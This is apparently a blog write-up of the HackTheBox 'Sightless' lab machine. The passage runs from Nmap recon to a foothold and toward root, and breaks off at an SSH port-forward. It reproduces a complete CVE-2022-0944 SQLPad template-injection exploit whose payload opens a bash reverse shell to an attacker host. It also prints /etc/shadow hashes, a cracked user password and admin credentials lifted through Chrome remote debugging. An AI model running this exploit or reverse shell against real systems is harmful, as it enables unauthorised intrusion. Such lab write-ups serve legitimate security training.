This is ranked as an easy box in HTB. I personally found the root flag part of this challeng very complex.Now diving into the challenge, started off with a Nmap scan

```diff
Nmap scan report for 10.10.11.32
Host is up (0.16s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative                                                                                                                        
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)                                                                          
| ssh-hostkey:                                                                                                                                              
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://sightless.htb/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=10/16%Time=671009E1%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x2
SF:0Server\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x2
SF:0try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\
SF:x20being\x20more\x20creative\r\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=10/16%OT=21%CT=1%CU=39657%PV=Y%DS=2%DC=T%G=Y%TM=671
OS:00A2A%P=x86_64-pc-linux-gnu)SEQ(SP=F4%GCD=1%ISR=111%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=F5%GCD=1%ISR=111%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST
OS:11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=F
OS:E88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M
OS:53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T
OS:4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+
OS:%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y
OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%
OS:RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   160.19 ms 10.10.14.1
2   161.23 ms 10.10.11.32
```

Firstly we need to add the IP address to /etc/hosts file and map it to sightless.htb. Now, visiting the site and checking out the source code reveals another endpoint, ==http://sqlpad.sightless.htb/==. Now, map sqlpad.sightless.htb also to the previously found IP as it seems to be a vhost. Upon further analysis, the version of sqlpad used is 6.10.0, which seems to be vulnerable to a Server Side Template Injection attack allowing for remote code execution. We can try to leverage this RCE vulnerability to gain foothold into this machine

Came across this payload on github by 0xRoqeeb. It does a great job

```diff
import argparse
import requests

def main():
   
    parser = argparse.ArgumentParser(description="CVE-2022-0944 RCE Exploit")
    parser.add_argument('root_url', help="Root URL of the SQLPad application")
    parser.add_argument('attacker_ip', help="attacker ip")
    parser.add_argument('attacker_port', help="attacker port")
    
    args = parser.parse_args()

    target_url = f"{args.root_url}/api/test-connection"

    payload = f"{{{{ process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/{args.attacker_ip}/{args.attacker_port} 0>&1\"') }}}}"

    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
    }

    #POST data (JSON body of the request)
    data = {
        "name": "test",
        "driver": "mysql",
        "data": {
            "database": payload
        },
        "database": payload
    }

    try:
        response = requests.post(target_url, headers=headers, json=data)
       
        print(f"Response status code: {response.status_code}")
        print(f"Response body: {response.text}")

        if response.status_code == 200:
            print(f"Exploit sent successfully. Check your listener on {args.attacker_ip}:{args.attacker_port}")
        else:
            print(f"Exploit sent, but server responded with status code: {response.status_code}. Check your listener.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
```

By using the above exploit, we have gained shell
![alt text](/assets/image12.png)
Don't be fooled by the root username, we are inside a docker instance. It took me a while to find out way to move forward from here. Initially my thinking was to break out of this instance, but then while doing the regular recon, noticed that we had access to the /etc/shadow file

```diff
cat /etc/shadow
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
daemon:*:19051:0:99999:7:::
bin:*:19051:0:99999:7:::
sys:*:19051:0:99999:7:::
sync:*:19051:0:99999:7:::
games:*:19051:0:99999:7:::
man:*:19051:0:99999:7:::
lp:*:19051:0:99999:7:::
mail:*:19051:0:99999:7:::
news:*:19051:0:99999:7:::
uucp:*:19051:0:99999:7:::
proxy:*:19051:0:99999:7:::
www-data:*:19051:0:99999:7:::
backup:*:19051:0:99999:7:::
list:*:19051:0:99999:7:::
irc:*:19051:0:99999:7:::
gnats:*:19051:0:99999:7:::
nobody:*:19051:0:99999:7:::
_apt:*:19051:0:99999:7:::
node:!:19053:0:99999:7:::
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
```

The last user, michael looked interesting. Tried to break his password hash and found the password to be ==insaneclownposse==. Now SSH to 10.10.11.32 using michael:insaneclownposse and we have the user.txt

This is where things get complex. I looked around for the usual misconfiguration in SUDO and SUID permissions and similar stuff. During the recon, came across the following from the linpeas scan


![alt text](/assets/image13.png)

Chrome should not be run on debug mode, as this exposes sensitive login information to attackers, which might lead to exploitation. Here the debug mode is set to run on port 0, meaning any available port. So, it will be hard to pin-point which port is running chrome debug 

![alt text](/assets/image14.png)

These ports are only running locally, so to test them, we need port-froward and using trial and error I found the needed port to be 40865. I used to following command for port-forwarding all the above shown ports

```diff
ssh -L 40865:127.0.0.1:40865 -L 42293:127.0.0.1:42293 -L 49443:127.0.0.1:49443 -L 33060:127.0.0.1:33060  michael@10.10.11.32                    

```

Additionally, we to configure 127.0.0.1:40865 in chrome://inspect/#devices. This helps the chrome browser inspect, what is happening in a remote browser. Once, this is done we can inspect what is happening 

![alt text](/assets/image15.png)

There seems to be another endpoint ==admin.sightless.htb== with the credentials admin:ForlorfroxAdmin. It seems to running on internal port 8080. Let's try to port-forward this and login using the above credentials
.Also, map 127.0.0.1:8080 to admin.sightlless.htb

```diff
ssh -L 8080:127.0.0.1:8080  michael@10.10.11.32                    
```

